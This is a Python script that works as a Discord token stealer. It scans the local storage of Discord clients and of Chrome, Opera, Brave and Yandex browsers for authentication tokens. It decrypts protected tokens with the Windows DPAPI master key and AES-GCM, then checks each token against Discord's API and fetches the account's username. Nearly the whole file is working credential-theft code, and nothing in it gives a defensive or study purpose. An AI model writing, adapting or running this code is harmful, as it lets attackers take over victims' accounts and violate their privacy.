import os, re, requests, json, ntpath
from Cryptodome.Cipher import AES
from base64 import b64decode
from win32crypt import CryptUnprotectData
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def win_decrypt(encrypted_str: bytes) -> str:
    return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

def get_master_key(path: str or os.PathLike):
    if not ntpath.exists(path):
        return None
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    try:
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        return win_decrypt(master_key[5:])
    except KeyError:
        return None

def decrypt(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(e)
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

def exists(token: str) -> bool:
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if r.status_code == 401:
        return False
    return True

def get_username(token):
    if exists(token):
        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
        content = r.json()
        return f"{content['username']}#{content['discriminator']}"
    return 401

def get_tokens(path):
    disc = path
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for token in re.findall(encrypted_regex, line):
                if "cord" in path:
                    tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), get_master_key(f'{disc}\\Local State')))
            for token in re.findall(regex, line):
                tokens.append(token)
    return tokens


def detect_tokens() -> list[str]:
    checked = []
    for plat, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            if token in checked:
                continue
            checked.append(token)
    return checked